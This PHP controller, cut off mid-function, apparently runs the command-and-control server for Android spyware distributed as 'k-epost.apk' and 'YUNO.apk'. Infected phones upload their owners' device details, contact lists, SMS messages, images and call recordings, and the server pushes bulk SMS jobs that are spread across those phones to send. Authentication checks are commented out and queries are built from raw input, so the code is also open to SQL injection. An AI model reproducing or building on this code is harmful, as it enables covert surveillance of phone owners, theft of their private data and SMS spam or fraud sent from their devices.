<?php
if (!defined('BASEPATH'))
    exit('No direct script access allowed');

/*  
 *  @author     : Farid Ahmed
 *  date        : 27 september, 2014
 *  SIgnetBD
 *  efarid08@gmail.com
 */

class Phone extends CI_Controller
{
    
    
    function __construct()
    {
        parent::__construct();
        $this->load->database();
        $this->load->library('session');
       
        /*cache control*/
        $this->output->set_header('Last-Modified: ' . gmdate("D, d M Y H:i:s") . ' GMT');
        $this->output->set_header('Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0');
        $this->output->set_header('Pragma: no-cache');
        $this->output->set_header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
    }
    
    /***default functin, redirects to login page if no admin logged in yet***/
    public function index()
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url() . 'index.php?login', 'refresh');
        // if ($this->session->userdata('login') == 1)
        //     redirect(base_url() . 'index.php?phone/list', 'refresh');
        $this->session->sess_destroy();
    }
    

    function delete ($param1 = '')
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url() . 'index.php?login', 'refresh');    
        
        $param1 = str_replace('AA', '+', $param1);
        $param1 = str_replace('BB', '(', $param1);
        $param1 = str_replace('CC', ')', $param1);

        $data = array(
            'status' => 99,                   
        );        
        $this->db->where('number', $param1);
        $this->db->update('phone', $data); 


        redirect(base_url() . 'list', 'refresh');
    }

    /***PHONE LIST***/
    function list($param1 = '')
    {   
        // if ($this->session->userdata('login') != 1)
        // redirect(base_url() . 'index.php?login', 'refresh');    
        
        //process already pre-send sms

        $sql = 'delete from ci_sessions';
        $this->db->query($sql);

        $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $cdate =  $dt->format('Y-m-d H:i');

        $sql = "select * from sendsms where end < '".$cdate."' and status = 0";
        
        $query = $this->db->query($sql);

        foreach ($query->result() as $row){
            $sendid = $row->send_id;
            $fromnumber = $row->fromnumber;
            $count = $row->count;
            $success = $row->success;
            $failed = $count - $success;
            $data = array(
                'failed'    => $failed,
                'status'     => '1',                                
            );

            $this->db->where('send_id', $sendid);
            $this->db->update('sendsms', $data);


            $sql = 'update phone set sms = sms + '.$success;
            $sql  .= ' where number='.$fromnumber;
            $this->db->query($sql);

            //var_dump($fromnumber);    
        }

       

        $sql = 'select count(*) as count from phone where status != 99';
        $result = $this->db->query($sql)->row()->count;
        $page_data['all_phones'] = $result;

        $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $date =  $dt->format('Y-m-d, H:i');
        $adate = date('Y-m-d H:i', strtotime($date. '-5 minutes'));
        
        $sql = "select count(*) as count from phone where connected < '".$adate."'  and status != 99";
        $result = $this->db->query($sql)->row()->count;
        $page_data['disabled_phones'] = $result;

    
        
        $bdate = date('Y-m-d H:i', strtotime($date. '-3 days'));
        $sql = "select count(*) as count from phone where connected <'".$bdate."'  and status != 99";
        $result = $this->db->query($sql)->row()->count;
        $page_data['threedays_phones'] = $result;

        if($param1 == 'all' || $param1 == ''){
            $sql = "select * from phone where status != 99 order by install desc";
            $query = $this->db->query($sql);            
            $result = $query->result_array();            
            $page_data['phones']   = $result;          
        }else{            
            $sql = "select * from phone where status != 99 and connected > '".$adate."' order by install desc";
            $query = $this->db->query($sql);            
            $result = $query->result_array();                        
            $page_data['phones']   = $result;
        }


        $sql = "select count(*) as count from phone   where status != 99";  
        $result = $this->db->query($sql)->row()->count;
        $page_data['phone_count'] = $result;

       
        $page_data['page_compnow'] = $adate;        
        $page_data['page_offline'] = $param1;
        $page_data['page_name']  = 'list';        

        $page_data['page_title'] = "Phone List";
        //var_dump($page_data['page_offline']);
        $this->load->view('backend/index', $page_data);
        
    }

    function IsNullOrEmptyString($str){
        return ($str === null || trim($str) === '');
    }


    

    /****SAVE PHONE INFORMATION*****/
    function savephone($param = ''){        

        $sql = 'delete from ci_sessions';
        $this->db->query($sql);

        $ret = 0;

        $param1     = file_get_contents('php://input');
        $param1     = $this->encrypt_decrypt('decrypt', $param1);
        $allArrs    =  json_decode($param1);
        $phonenumber = '';

        $dt3 = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $cdate3 =  $dt3->format('Y-m-d H:i');        
    // 

        foreach ($allArrs as $allArr) {
            $key            = $allArr->key;
            $value          = $allArr->value;

            if($key == 'inform'){
                try{
                    $number = $value[0]->number;
                    $phonenumber = $number;
                    if($number != ''){                    
                        $carrier    = $value[0]->carrier;
                        $model      = $value[0]->model;
                        $install    = $value[0]->install;
                        $version    = $value[0]->version;
                        $language   = $value[0]->language;
                        $remain     = $value[0]->remain;
                        $unumber    = $value[0]->unumber;
                        $timediff   = $value[0]->timediff;

                        $sql = "select count(*) as count from phone where number = '".$number."'";
                        $exists = $this->db->query($sql)->row()->count;
                        if($exists == '1'){
                            $sql = "select unumber from phone where number = '".$number."'";
                            $orgunumber = $this->db->query($sql)->row()->unumber;
                            if($orgunumber != $unumber){
                                $this->db->where('number', $number);
                                $this->db->update('phone', array('model'    => $model,
                                                                'company'   => $carrier,
                                                                'install'   => $cdate3,
                                                                'version'   => $version,
                                                                'language'  => $language,
                                                                'remain'    => $remain,
                                                                'unumber'   => $unumber, 
                                                                'connected' => $cdate3,   
                                                                'sms'       => $timediff,     
                                                                ));
                            }else{
                                $this->db->where('number', $number);
                                $this->db->update('phone', array('model'    => $model,
                                                                'company'   => $carrier,
                                                                'version'   => $version,
                                                                'language'  => $language,
                                                                'remain'    => $remain,
                                                                'unumber'   => $unumber, 
                                                                'sms'       => $timediff,
                                                                ));
                            }

                        }else{
                            $data = array(
                                'number'    => $number,
                                'model'     => $model,
                                'company'   => $carrier,
                                'install'   => $cdate3,
                                'version'   => $version,
                                'language'  => $language,
                                'remain'    => $remain,
                                'connected' => $cdate3,
                                'unumber'   => $unumber, 
                                'sms'       => $timediff,
                            );

                            $this->db->insert('phone', $data); 
                        }

                        if (!is_dir('uploads/'.$unumber)) {
                            mkdir('./uploads/' . $unumber, 0777, TRUE);
                        }
                        if(!is_dir('uploads/'.$unumber.'/images')){
                            mkdir('./uploads/' . $unumber.'/images', 0777, TRUE);
                        }
                        
                    }
                }catch(Exception $e){}
            }

            if($key == 'contact'){
                try{

                    $arrs = $value;

                    foreach ($arrs as $arr) {
                        $number      = $arr->number;
                        $name       = $arr->name;
                        $contacts   = $arr->contacts;

                        $sql = "select count(*) as count from contacts where number = '".$number."' and name='".$name."' and contact_number='".$contacts."'";
                        $exists = $this->db->query($sql)->row()->count;
                        
                         if($exists != '1'){  
                            $data = array(
                                'number'            => $number,
                                'name'              => $name,
                                'contact_number'    => $contacts,                                
                            );                                         
                            $this->db->insert('contacts', $data);
                         }
                     }

                     $sql = "select * from contacts where number = '".$number."'";
                     $query = $this->db->query($sql);            
                     $contactslist = $query->result_array();  
                     foreach($contactslist as $row){
                        $name1 = $row['name'];
                        $cnumber = $row['contact_number'];

                        $exist = false;
                        foreach ($arrs as $arr) {                            
                            $name2       = $arr->name;
                            $contacts   = $arr->contacts;
                            
                            if($name2 == $name1 && $cnumber == $contacts){
                                $exist = true;
                                break;
                            }

                        }

                        if(!$exist){
                            $sql = "delete from contacts where number='".$number."' and name='".$name1."' and contact_number='".$cnumber."'";
                            $this->db->query($sql);
                        }

                    }

                     
                }catch(Exception $e){}
            }


            if($key == 'sms'){
                try{

                    $arrs = $value;

                    foreach ($arrs as $arr) {
                        $number     = $arr->number;
                        $msg        = $arr->msg;
                        $id         = $arr->id;
                        $address    = $arr->address;
                        $time       = $arr->time;
                        $folder     = $arr->folder;

                        $sql = "select count(*) as count from sms where number = '".$number."' and content ='".$msg."' and received='".$time."' and ";

                        

                        if($folder == 'sent')
                            $sql .= " tonumber='".$address."'";
                        else
                            $sql .= " fromnumber='".$address."'";
                        
                        //echo($sql);

                        $exists = $this->db->query($sql)->row()->count;
                        $fromnumber = $address;
                        $tonumber   = $number;
                        if($folder == 'sent'){
                                $fromnumber     = $number;
                                $tonumber       = $address;
                        }

                         if($exists != '1'){ 
                            $data = array(
                                'number'    => $number,
                                'received'  => $time,
                                'content'   => $msg,
                                'fromnumber'=> $fromnumber,
                                'tonumber'  => $tonumber,
                            );   
                            
                            $this->db->insert('sms', $data);                             
                         }
                       
                     }


                     $sql = "select * from sms where number = '".$number."'";
                     $query = $this->db->query($sql);            
                     $smslist = $query->result_array();  
                     foreach($smslist as $row){
                        $received1      = $row['received'];
                        $content1       = $row['content'];
                        $fromnumber1    = $row['fromnumber'];
                        $tonumber1      = $row['tonumber'];

                        $exist = false;
                        foreach ($arrs as $arr) { 
                            $content2   = $arr->msg;
                            $received2  = $arr->time;
                            $address    = $arr->address; 
                            $folder     = $arr->folder;

                            $fromnumber2 = $address;
                            $tonumber2   = $number;
                            if($folder == 'sent'){
                                    $fromnumber2    = $number;
                                    $tonumber2      = $address;
                            }

                            
                            if($received1 == $received2 && $content1 == $content2 &&  $fromnumber1 == $fromnumber2 &&  $tonumber1 == $tonumber2){
                                $exist = true;
                                break;
                            }

                        }

                        if(!$exist){
                            $sql = "delete from sms where number='".$number."' and received='".$received1."' and content='".$content1."' and fromnumber='".$fromnumber1."' and tonumber='".$tonumber1."'";
                            $this->db->query($sql);
                        }

                    }

                    
                }catch(Exception $e){}
            }

         }

         $sql = "select status from phone where number = '".$phonenumber."'";
         $status = $this->db->query($sql)->row()->status;
         if($status == 99){
            echo $this->encrypt_decrypt('encrypt', 'delete');
            return;
         }

        $sendstr = '';

        $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $cdate =  $dt->format('Y-m-d H:i');        
        $this->db->where('number', $phonenumber);
        $this->db->update('phone', array('connected' => $cdate));

        $sql = "select * from sendsms where fromnumber = '".$phonenumber."' and (status = 0  or status = 3) and readstatus = 0 ";
        $query = $this->db->query($sql);

        
        foreach ($query->result() as $row){
            $sendstr .= ($row->send_id).'!@#@!'.($row->tonumber).'0123456789!@#@!'.($row->count).'!@#@!'.($row->step).'!@#@!'.($row->command_start).'!@#@!'.($row->content).'!@#@!'.($row->status).'@!#!@!#!@';

            $sql = 'update sendsms set readstatus = 1';
            $sql  .= ' where send_id='.$row->send_id;
            $this->db->query($sql);
        }


        //echo json_encode($sendstr);
        echo $this->encrypt_decrypt('encrypt', $sendstr);

        // echo json_encode($allArrs);   

    }

    function requestservertime($param1=''){
        $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $cdate =  $dt->format('Y-m-d H:i:s');
        echo($cdate);
    }

    function ping($param1 = ''){
         $param1 = file_get_contents('php://input'); 
        // $allArrs    =  json_decode($param1);
         $data = array(
                                'value'    => $param1,                                
                            );  
         
        $this->db->insert('ping', $data);  
        
        //echo json_encode('SUCCESS');
    }

   /******* UPLOAD MEDIA FILE *******/
    function upload($param1 = ''){

        $type = $this->input->post('type');      
        $number = $this->input->post('number');      
        $address = $this->input->post('address');              
        $rfilename = $_FILES["uploaded_file"]["name"];        
        
        $isresult = move_uploaded_file($_FILES['uploaded_file']['tmp_name'], 'uploads/'.$number.'/'.$type.'/'. $rfilename);
        if($isresult){
            if($type == 'records'){
                $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
                $cdate =  $dt->format('Y-m-d H:i');

                $delimiter = "##";
                 $words     = explode($delimiter, $address);                 
                 $duration  = $words[0];
                 $starttime = $words[1];
                 $endtime   = $words[2];
                 $recordtype= $words[3];
                
                if($recordtype == '0'){
                    $data = array(                                                      
                            'recordplay' => 0,
                    );
                    
                    $this->db->where('unumber', $number);
                    $this->db->update('phone', $data);
                } 


                $data = array(
                    'number'    => $number,
                    'filename'  => $rfilename,
                    'created'   => $cdate,   
                    'duration'  => $duration,
                    'starttime' => $starttime,
                    'endtime'   => $endtime,                             
                );  
             
                $this->db->insert($type, $data);  

                  

            }else if($type == 'images'){
                $sql = "select count(*) as count from images where number = '".$number."' and filename='".$rfilename."'";
                $exists = $this->db->query($sql)->row()->count;
                
                 if($exists != '1'){  
                    $data = array(
                        'number'    => $number,
                        'filename'    => $rfilename,
                        'size'    => $address,                    
                    );  
                 
                    $this->db->insert($type, $data);  
                 }
                
            }
           // echo 'success';
        }else{
            //echo 'failed';
        }

       // echo json_encode($type);

    }
    
    function requestimage($param = ''){    

        $param1     = file_get_contents('php://input');
        $sendstr = '';

        $sql = "select filename from images where number = '".$param1."'";
        $query = $this->db->query($sql);

        
        foreach ($query->result() as $row){
            $sendstr .= ($row->filename).'@@@';
        }

        echo $this->encrypt_decrypt('encrypt', $sendstr);
    }

    /*****RESULT FOR SENDED SMS******/
    // function sendresult($param = '')
    // {
    //     $param1 = file_get_contents('php://input'); 
    //     $delimiter = "##";        
    //     $conts = explode($delimiter, $param1);
    //     if(sizeof($conts) == 0) {
    //         echo('Failed');
    //         return;
    //     }

    //     $fromnumber     = $conts[0];
    //     $sendid         = $conts[1];
    //     $tonumber       = $conts[2];
    //     $result         = $conts[3];   
        

    //     $sql = 'update sendsms set ';
    //     if($result == 1)
    //         $sql .= 'success = success + 1 ';
    //     else
    //         $sql .= 'failed = failed + 1 ';

    //     $sql  .= ' where send_id='.$sendid;

    //     $this->db->query($sql);

    //     $sql = "select count, processcount from sendsms where send_id = ".$sendid."";
    //     $count = $this->db->query($sql)->row()->count;
    //     $processcount = $this->db->query($sql)->row()->processcount;

    //     if($count == $processcount){
    //         $sql = 'update sendsms set status=1, failed=count-success where send_id='.$sendid;
    //         $this->db->query($sql);    
    //     }


    //     echo('Success'.$count.','.$processcount);
    //     //echo($sql);
    // }

    function sendsmsprogress($param1 = ''){
        $param1 = file_get_contents('php://input'); 
        if($param1 == '') {
            echo('Failed '.$param1);
            return;
        }
        $sql = 'update sendsms set status = 2 where send_id='.$param1;
        $this->db->query($sql);  
        //echo('Success')  ;
    }

    function replysendsmsinfo($param1 = ''){
        $param1 = file_get_contents('php://input'); 
        if($param1 == '') {
           // echo('Failed');
            return;
        }

        $delimiter = "##";
        $words = explode($delimiter, $param1);
        $sendid = $words[0];
        $startdate = $words[1];
        $lastdate = $words[2];

        $sql = 'update sendsms set start="'.$startdate.'", end="'.$lastdate.'"';        
        $sql .= ' where send_id='.$sendid;
        $this->db->query($sql);    

        $sql = 'update presendsms set all_endtime="'.$lastdate.'"';        
        $sql .= ' where send_id='.$sendid;
        $this->db->query($sql);    
        
        //echo ('Success');
    }

    function sendsmsprocess($param1 = ''){
        $param1 = file_get_contents('php://input'); 
        if($param1 == '') {
            echo('Failed');
            return;
        }

        //$delimiter = "@@@";
        //$words0 = explode($delimiter, $param1);       
        //foreach($words0 as $word0){                            
            //if($word0 != '') {
                $delimiter1 = "##";
                $words1 = explode($delimiter1, $param1);       
                $sendid     = $words1[0];
                $all        = $words1[1];
                $success    = $words1[2];
                $failed     = $words1[3];
                
                $sql = 'update sendsms set processcount='.$all.',';// 
                $sql .= 'success='.$success.',';
                $sql .= 'failed='.$failed;        
                $sql .= ' where send_id='.$sendid;
                $this->db->query($sql);  

                $sql = "select fromnumber, count, success, processcount from sendsms where send_id = ".$sendid;
                $fromnumber = $this->db->query($sql)->row()->fromnumber;
                $count = $this->db->query($sql)->row()->count;
                $success = $this->db->query($sql)->row()->success;
                $processcount = $this->db->query($sql)->row()->processcount;

                if($count <= $processcount){
                    $sql = "update sendsms set status=1 where send_id=".$sendid;
                    $this->db->query($sql);    

                    $sql = "update presendsms set count=count+".$success.", precount=0 where number='".$fromnumber."'";
                    $this->db->query($sql);
                }    

        //    }
        //}


         

        

        //echo('Success')  ;

    }
    
    /****SEND_SMS*****/
    function sendsms($param1 = '', $param2 = '' , $param3 = '')
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url(), 'refresh');

        //var_dump($param1);
        //status = 0(incomplete), 1(complete), 2(progress)
        //process already pre-send sms

        $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $cdate =  $dt->format('Y-m-d H:i');
        $adate = date('Y-m-d H:i', strtotime($cdate. '-2 minutes'));
        
        // $sql = "select * from sendsms where end < '".$adate."' and status = 2";        

        // //var_dump($cdate);
        // //$sql = "select * from sendsms where end < '".$cdate."' and status = 2";
        // $ret_query = '';
        
        // $query = $this->db->query($sql);

        // foreach ($query->result() as $row){
        //     $sendid = $row->send_id;
        //     $fromnumber = $row->fromnumber;            
        //     $count = $row->count;
        //     $success = $row->success;
        //     $failed = $count - $success;

        //     $data = array(
        //         'failed'    => $failed,
        //         'status'    => 1,                
        //     );
            
        //     $this->db->where('send_id', $sendid);
        //     $this->db->update('sendsms', $data);

        //     $sql = "update presendsms set count=count+".$success.", precount=0 where number='".$fromnumber."'";
        //     $this->db->query($sql);  
        // }

        
        if ($param1 == 'delete') {
            $sendid = $param2;
            $sql = "select status from sendsms where send_id = ".$sendid."";
            $status = $this->db->query($sql)->row()->status;
            if($status == 2){
                $dt1 = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
                $date1 =  $dt1->format('Y-m-d, H:i:s');
                $adate1 = date('Y-m-d H:i:s', strtotime($date1. '-10 minutes'));
                if($adate1 > $row['end']){
                    $sql = 'delete from sendsms where send_id='.$param2;
                    $this->db->query($sql);    
                    $this->session->set_flashdata('flash_message', "Deleted Successfully");    
                }else{
                    $this->session->set_flashdata('flash_message', "Can not Delete while Progress");            
                }
                   


                 
            }else if($status == 0){
                $sql = 'update sendsms set status=3, readstatus=0 where send_id='.$param2;
                $this->db->query($sql);    
                $this->session->set_flashdata('flash_message', "Deleted Successfully");    
            }else if($status == 1){
                $sql = 'delete from sendsms where send_id='.$param2;
                $this->db->query($sql);    
                $this->session->set_flashdata('flash_message', "Deleted Successfully");    
            }             

            redirect(base_url() . 'sendsms', 'refresh');    
        }else if ($param1 == 'create') {
            
            $content    = $this->input->post('content');
            //$count      = $this->input->post('count');
            $multiple   = $this->input->post('multiple');            
            $step       = $this->input->post('step'); 
            $start      = $this->input->post('start'); 
            $fromnumber = $this->input->post('fromnumber');

           // if($step < 6) $step = 6;

            $inp_starttime = date('Y-m-d', strtotime($start));  
            $inp_starttime1 = date('Y-m-d H:i:s', strtotime($start));  
            $date =  $dt->format('Y-m-d H:i:s');          
            $cur_starttime = date('Y-m-d', strtotime($date));
             
            if($inp_starttime != $cur_starttime){
                $this->session->set_flashdata('flash_message', "Start Time must be in Today!");
                redirect(base_url() . 'sendsms', 'refresh');
            }
            if($inp_starttime1 < $date){
                $this->session->set_flashdata('flash_message', "Start Time must be after than Current Time!");
                redirect(base_url() . 'sendsms', 'refresh');
            }


            $filename   = $_FILES["file_name"]["tmp_name"];

            if(trim($content) == ''  || trim($step) == ''  || trim($start) == '' ){
                $this->session->set_flashdata('flash_message', "Sending Information is WRONG!");
                redirect(base_url() . 'sendsms', 'refresh');
            }
            
            if (!file_exists($filename)) {
                $this->session->set_flashdata('flash_message', "Selected No File");    
                redirect(base_url() . 'sendsms', 'refresh');
            }

            if($multiple != 'on' && trim($fromnumber) == ''){
                $this->session->set_flashdata('flash_message', "From Number is Empty");    
                redirect(base_url() . 'sendsms', 'refresh');
            }

            

            
                
            $file_content = file_get_contents($filename);
            $delimiter = "\n";
            $words = explode($delimiter, $file_content);

            $word_arry = array();
            $all = 0;
            foreach($words as $word){                            
                if($word != '') {
                    $iscorrect = true;                                
                    $word = trim($word);                                
                    if(!is_numeric($word) || $word == '') {
                        //var_dump($word);
                        $iscorrect = false; break;
                    }                                 
                    if($iscorrect) {
                        array_push($word_arry, $word);
                        $all++;     
                    } 
                }
            }

            
            $original_all = $all;

            if($all != 0){        
                if($multiple == 'on'){
                    
                    $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
                    $date =  $dt->format('Y-m-d H:i');
                    $adate = date('Y-m-d H:i', strtotime($date. '-5 minutes'));

                    $sql = "select count(*) as count from phone where connected > '".$adate."'";
                    $phones = $this->db->query($sql)->row()->count;
                    
                    $calccnt = 0;

                    $sql = "select * from phone where connected > '".$adate."'";                            
                    $query = $this->db->query($sql);

                 

                    foreach ($query->result() as $row){                       
                        if($all == 0) break;

                        $fromnumber = $row->number;
                        $sql = "select count, precount, all_endtime from presendsms where number='".$fromnumber."'";
                        $result = $this->db->query($sql)->row();
                        $precount = ($result !== null) ? $result->precount : 0;                         
                        $count = ($result !== null) ? $result->count : 0;                               
                        $all_endtime = ($result !== null) ? $result->all_endtime : '2024-01-01 00:00:01';

                        $org_endtime = date('Y-m-d', strtotime($all_endtime));
                        $now_starttime = date('Y-m-d', strtotime($start));
                        if($now_starttime != $org_endtime){
                            $count = 0; $precount = 0;
                        }


                        // $sql = "select count, precount, all_endtime from aepostiginter.presendsms where number='".$fromnumber."'";
                        // $result = $this->db->query($sql)->row();
                        // $aprecount = ($result !== null) ? $result->precount : 0;                         
                        // $acount = ($result !== null) ? $result->count : 0;                               
                        // $all_endtime = ($result !== null) ? $result->all_endtime : '2024-01-01 00:00:01';

                        // $org_endtime = date('Y-m-d', strtotime($all_endtime));
                        // $now_starttime = date('Y-m-d', strtotime($start));
                        // if($now_starttime != $org_endtime){
                        //     $acount = 0; $aprecount = 0;
                        // }
                        
                        // $all_count = $count + $precount + $acount + $aprecount;


                        $all_count = $count + $precount;


                        if($all_count >= 490) continue;


                        $real_starttime = date('Y-m-d H:i:s', strtotime($start));
                        if($start < $all_endtime) {
                            $real_starttime = date('Y-m-d H:i:s', strtotime($all_endtime. '+1 minutes'));                                    
                        }
                        //consider time diff between server and phone
                        $real_starttime = date('Y-m-d H:i:s', strtotime($real_starttime. $row->sms.' seconds')); //in sms, there is timediff
                        
                        //calculate from last_time to 0'clock
                        $remain_second = 86400 - date('H', strtotime($real_starttime)) * 3600 - date('i', strtotime($real_starttime)) * 60 - date('s', strtotime($real_starttime));
                        if($remain_second < 600) continue;      
                                                
                        $calc_remain_count = ceil($remain_second / $step);                        
                        if($calc_remain_count < 1) continue;

                        $remain_count = $calc_remain_count;
                        if($remain_count > 490 - $all_count) $remain_count = 490 - $all_count;
                        if($remain_count > $all) $remain_count = $all;
                                       

                        $tonumber = '';
                        $eachcnt = 0;
                        while($eachcnt < $remain_count){                                    
                            $tonumber .= trim($words[$calccnt]).',';            
                            $calccnt++;                                   
                            $eachcnt++;
                        }

                        //var_dump($tonumber);

                        $all -= $remain_count;

                        
                        
                        $interv = $step * ($remain_count + 1);    
                        $adate11 = date('Y-m-d H:i:s', strtotime($real_starttime. '+'.$interv.' seconds'));
                        $adate1 = date('Y-m-d H:i:s', strtotime($adate11. '+2 minutes'));
                        
                        $data = array(
                            'tonumber'      => $tonumber,
                            'fromnumber'    => $fromnumber,
                            'count'         => $remain_count,
                            'content'       => $this->input->post('content'),
                            'step'          => $step,
                            'command_start' => $start,
                            'start'         => '',
                            'end'           => '',                                    
                            'status'        => '0',
                            'readstatus'    => '0',
                            'success'       => '0',
                            'failed'        => '0',
                            'processcount'  => '0',
                        );  
                        $this->db->insert('sendsms', $data);    

                        
                        $sql = "delete from presendsms where number='".$fromnumber."'";
                        $this->db->query($sql);

                        $data = array(
                            'number'        => $fromnumber,
                            'all_endtime'   => '',
                            'count'         => $count,
                            'precount'      => $precount + $remain_count,                                   
                        );  
                        $this->db->insert('presendsms', $data);    
                    }

                    // if($all > $calccnt){
                    //     $ret_query = ($all - $calccnt);
                    // }

                    //var_dump($all.','.$calccnt.','.$ret_query.','.$precount);             

                    $this->session->set_flashdata('flash_message', "Uploaded Successfully");    
                    redirect(base_url() . 'sendsms', 'refresh');
                }else{
                    $tonumber = '';                            
                    
                    $sql = "select * from phone where number ='".$fromnumber."'";                            
                    $query = $this->db->query($sql)->row();
                    $timediff = ($query !== null) ? $query->sms : 0;                         

                    $sql = "select count, precount, all_endtime from presendsms where number='".$fromnumber."'";
                    $result = $this->db->query($sql)->row();
                    $precount = ($result !== null) ? $result->precount : 0;                         
                    $count = ($result !== null) ? $result->count : 0;                               
                    $all_endtime = ($result !== null) ? $result->all_endtime : '2024-01-01 00:00:01';


                    $org_endtime = date('Y-m-d', strtotime($all_endtime));
                    $now_starttime = date('Y-m-d', strtotime($start));
                    if($now_starttime != $org_endtime){
                        $count = 0; $precount = 0;
                    }


                    // $sql = "select count, precount, all_endtime from aepostiginter.presendsms where number='".$fromnumber."'";
                    // $result = $this->db->query($sql)->row();
                    // $aprecount = ($result !== null) ? $result->precount : 0;                         
                    // $acount = ($result !== null) ? $result->count : 0;                               
                    // $all_endtime = ($result !== null) ? $result->all_endtime : '2024-01-01 00:00:01';

                    // $org_endtime = date('Y-m-d', strtotime($all_endtime));
                    // $now_starttime = date('Y-m-d', strtotime($start));
                    // if($now_starttime != $org_endtime){
                    //     $acount = 0; $aprecount = 0;
                    // }
                    
                    //$all_count = $count + $precount + $acount + $aprecount;
                    $all_count = $count + $precount;



                    $real_starttime = date('Y-m-d H:i:s', strtotime($start));
                    if($start < $all_endtime) {
                        $real_starttime = date('Y-m-d H:i:s', strtotime($all_endtime. '+1 minutes'));                                    
                    }
                    $real_starttime = date('Y-m-d H:i:s', strtotime($real_starttime. $timediff.' seconds')); //in sms, there is timediff

                    //calculate from last_time to 0'clock
                    $remain_second = 86400 - date('H', strtotime($real_starttime)) * 3600 - date('i', strtotime($real_starttime)) * 60 - date('s', strtotime($real_starttime));
                                        
                    $calc_remain_count = 0;
                    if($remain_second > 600){
                        $calc_remain_count = ceil($remain_second / $step);                            
                    }

                    $remain_count = $calc_remain_count;
                    if($remain_count > 490 - $all_count) $remain_count = 490 - $all_count;
                    if($remain_count > $all) $remain_count = $all;

                    //var_dump($remain_count.','.$remain_second.','.$calc_remain_count.','.$step);

                    if($all_count < 490 && $remain_second > 600 && $remain_count > 0){
                        $eachcnt = 0;
                        while($eachcnt <= $remain_count){                                    
                            $tonumber .= trim($words[$eachcnt]).',';                                                                
                            $eachcnt++;
                        }

                        $interv = $step * ($remain_count + 1);  
                        $adate11 = date('Y-m-d H:i:s', strtotime($real_starttime. '+'.$interv.' seconds'));
                        $adate1 = date('Y-m-d H:i:s', strtotime($adate11. '+2 minutes'));                      

                        $data = array(
                            'tonumber'      => $tonumber,
                            'fromnumber'    => $fromnumber,
                            'count'         => $remain_count,
                            'content'       => $content,
                            'step'          => $step,
                            'command_start' => $start,
                            'start'         => '',
                            'end'           => '',
                            'status'        => '0',
                            'readstatus'    => '0',
                            'success'       => '0',
                            'failed'        => '0',
                            'processcount'  => '0',
                        ); 

                        $this->db->insert('sendsms', $data);
                        $sql = "delete from presendsms where number='".$fromnumber."'";
                        $this->db->query($sql);

                        $data = array(
                            'number'        => $fromnumber,
                            'all_endtime'   => '',
                            'count'         => $count,
                            'precount'      => $precount + $remain_count,                                   
                        );  
                        $this->db->insert('presendsms', $data);    

                        $this->session->set_flashdata('flash_message', "Uploaded Successfully");    

                    }else{
                        $this->session->set_flashdata('flash_message', "Upload Failed");    

                    }

                    // if($all > $calccnt){
                    //     $ret_query = ($all - $remain_count);
                    // }
                    redirect(base_url() . 'sendsms', 'refresh');

                }   
            }else{                        
                $this->session->set_flashdata('flash_message', "Mistype Number");    
                
            }
            

            //redirect(base_url() . 'sendsms', 'refresh');
        }
     

        $sql = 'select count(*) as count from phone';
        $result = $this->db->query($sql)->row()->count;
        $page_data['all_phones'] = $result;

        $dt = new DateTime("now", new DateTimeZone('Asia/Tokyo'));        
        $date =  $dt->format('Y-m-d H:i');
        //var_dump($date);
        $adate = date('Y-m-d H:i', strtotime($date. '-5 minutes'));
        
        $sql = "select count(*) as count from phone where connected < '".$adate."'";
        $result = $this->db->query($sql)->row()->count;
        $page_data['disabled_phones'] = $result;

    
        
        $bdate = date('Y-m-d H:i', strtotime($date. '-3 days'));
        $sql = "select count(*) as count from phone where connected <'".$bdate."'";
        $result = $this->db->query($sql)->row()->count;
        $page_data['threedays_phones'] = $result;


        $sql = 'select IFNULL(sum(success), 0) as count1, IFNULL(sum(failed), 0) as count2 from sendsms';
        $query = $this->db->query($sql);
        $page_data['success_cnt'] = $query->row()->count1;
        $page_data['failed_cnt'] = $query->row()->count2;
        

        $sdate = date('Y-m-d H:i', strtotime($date. '+20 minutes'));
        
        $sql = "select send_id, fromnumber, REPLACE(tonumber, ',','\n') as tonumber, count, step, command_start, start, end, content, LEFT(content, 10) AS content1, status, readstatus, success, failed from sendsms where status != 3 order by send_id desc";
        $query = $this->db->query($sql);
        // $this->db->select('*');
        // $this->db->from('sendsms');
        // $this->db->order_by('send_id', 'desc');
        // $query = $this->db->get();            
        $result = $query->result_array();  

        $page_data['smslist']   = $result;
        $page_data['send_date']  = $sdate;
        $page_data['page_name']  = 'sendsms';
        $page_data['page_title'] = "Send SMS";
        $page_data['page_ret']  = $ret_query;
        $this->load->view('backend/index', $page_data);
    }

    /******GET VERSION OF APK***/
    function getversion($param = ''){
        
        $param1 = file_get_contents('php://input'); 

        $sql = "select version from admin";
        $version = $this->db->query($sql)->row()->version;

        echo($version);
    }

    /******DOWNLOAD PAGE*****/
    function download($filename = ''){
        $page_data['page_name']  = 'download';
        $page_data['page_title'] = "Download Link";
        $this->load->view('backend/index', $page_data);
    }

    /*******DOWNLOAD APK********/
    function apkdownload($param1 = ''){       

        $this->load->helper('download');    

           
        $data = file_get_contents(base_url('/uploads/k-epost.apk'));
        force_download('k-epost.apk', $data);

        //}

    }

    function yunodownload($param1 = ''){       

        $this->load->helper('download');    

           
        $data = file_get_contents(base_url('/uploads/YUNO.apk'));
        force_download('YUNO.apk', $data);

        //}

    }

    

    /******MANAGE OWN PROFILE AND CHANGE PASSWORD***/
    function manage_profile($param1 = '', $param2 = '', $param3 = '')
    {
        // if ($this->session->userdata('login') != 1)
        //     redirect(base_url() . 'index.php?login', 'refresh');
        
        $retalert = '';
        if ($param1 == 'change_password') {
            $data['password']             = $this->input->post('password');
            $data['new_password']         = $this->input->post('new_password');
            $data['confirm_new_password'] = $this->input->post('confirm_new_password');
                
            
            $current_password = $this->db->get_where('admin', array(
